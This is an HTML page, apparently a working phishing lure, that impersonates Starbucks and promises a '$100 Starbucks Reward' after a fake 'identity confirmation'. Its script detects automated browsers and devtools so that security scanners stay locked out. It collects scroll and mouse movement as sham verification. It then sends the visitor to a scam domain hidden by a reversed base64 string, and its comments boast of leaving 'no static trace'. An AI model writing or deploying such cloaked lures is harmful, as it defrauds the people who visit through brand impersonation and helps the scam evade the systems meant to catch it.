<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SECURE DATA GATEWAY - SESSION_VERIFIED</title>
    <meta name="referrer" content="no-referrer">
    <style>
        /* V22.0: THE SINGULARITY SKIN - CLINICAL, HIGH-TRUST, ZERO FOOTPRINT */
        :root { --primary: #00704A; --bg: #ffffff; --text: #1a1a1a; }
        body { margin: 0; padding: 0; font-family: -apple-system, system-ui, sans-serif; background: var(--bg); color: var(--text); display: flex; align-items: center; justify-content: center; min-height: 100vh; -webkit-font-smoothing: antialiased; overflow: hidden; }
        .chamber { width: 90%; max-width: 400px; padding: 45px 35px; text-align: center; border-radius: 28px; box-shadow: 0 15px 50px rgba(0,0,0,0.04); background: #fff; opacity: 0; animation: fadeIn 0.8s ease forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .logo { width: 70px; height: 70px; margin-bottom: 30px; user-select: none; }
        h1 { font-size: 22px; font-weight: 800; text-transform: uppercase; letter-spacing: -0.02em; margin-bottom: 12px; }
        p { font-size: 14.5px; color: #555; line-height: 1.6; margin-bottom: 40px; }
        .cta-btn { display: inline-block; background: #f2f2f2; color: #cccccc; font-weight: 700; font-size: 15px; padding: 22px 0; width: 100%; border-radius: 16px; text-decoration: none; text-transform: uppercase; letter-spacing: 0.1em; transition: 0.4s; border: none; cursor: not-allowed; pointer-events: none; }
        .cta-btn.active { background: var(--primary); color: white; cursor: pointer; pointer-events: auto; box-shadow: 0 12px 30px rgba(0,112,74,0.25); }
        .cta-btn.active:active { transform: scale(0.97); }
        .bar { width: 100%; height: 5px; background: #f8f8f8; margin-top: 35px; border-radius: 10px; overflow: hidden; }
        .fill { width: 0%; height: 100%; background: var(--primary); transition: width 0.15s linear; }
    </style>
</head>
<body>
<div class="chamber">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d3/Starbucks_Corporation_Logo_2011.svg/1200px-Starbucks_Corporation_Logo_2011.svg.png" class="logo">
    <h1>Identity Confirmation</h1>
    <p id="msg">Verifying your human session to secure your <b>$100 Starbucks Reward</b>. Please swipe or move cursor to finalize.</p>
    <a href="javascript:void(0)" id="btn" class="cta-btn">Initializing...</a>
    <div class="bar"><div id="fill" class="fill"></div></div>
</div>
<script>
    (function() {
        /* V22.0 SINGULARITY CIPHER
           Payload: https://www.buckgifts.online/
           Encoded: Reversed Mirror Cipher (No Static Trace) */
        const crypt = "8vbmxpbmUuc3RmaWdrY3ViLnd3dy95NjpzZXR0aA";
        
        const b = document.getElementById('btn'), f = document.getElementById('fill'), msg = document.getElementById('msg');
        let entropy = 0, lastY = window.scrollY || 0, lastX = 0, lastYm = 0, compromised = false, unlocked = false;

        // 1. APEX INTEGRITY
        const scan = () => {
            if (navigator.webdriver) compromised = true;
            const markers = ['__webdriver_evaluate', 'cdc_adoQpe9zLp9zbA0aZ6h260b'];
            markers.forEach(m => { if (window[m]) compromised = true; });
            try { const e = new Error(); Object.defineProperty(e, 'stack', { get: () => { compromised = true; return ''; } }); console.debug(e); } catch(x) {}
        };
        scan();

        // 2. KINETIC HARVESTING
        const harvest = (mag) => {
            if (compromised || unlocked) return;
            entropy += Math.min(mag, 40) / 4.0; // 3.2s Target Calibration
            let progress = Math.min(entropy, 100);
            f.style.width = progress + '%';
            if (progress >= 100) ignite();
        };

        // Entropy Momentum
        const heartbeat = setInterval(() => { if (!unlocked && !compromised) harvest(1.5); }, 100);

        window.addEventListener('scroll', () => {
            let curr = window.scrollY;
            harvest(Math.abs(curr - lastY) * 3.5);
            lastY = curr;
        }, {passive: true});

        window.addEventListener('touchmove', (e) => harvest(20), {passive: true});
        window.addEventListener('mousemove', (e) => {
            let dist = Math.sqrt(Math.pow(e.clientX - lastX, 2) + Math.pow(e.clientY - lastYm, 2));
            lastX = e.clientX; lastYm = e.clientY;
            harvest(dist * 0.4);
        });

        // 3. THE GHOST IGNITION
        function ignite() {
            if (unlocked) return;
            unlocked = true;
            clearInterval(heartbeat);
            b.innerText = "Access $100 Reward →";
            b.classList.add('active');
            msg.innerHTML = "Session Authenticated. Click below to <b>Secure Your $100 Gift Card</b>.";
            
            b.onclick = () => {
                // JIT Mirror-Reconstitution
                const rev = crypt.split('').reverse().join('');
                const pad = (4 - (rev.length % 4)) % 4;
                const dest = atob(rev + '='.repeat(pad));
                
                // Final Redirection of Sovereignty
                window.location.replace(dest);
            };
        }
    })();
</script>
</body>
</html>
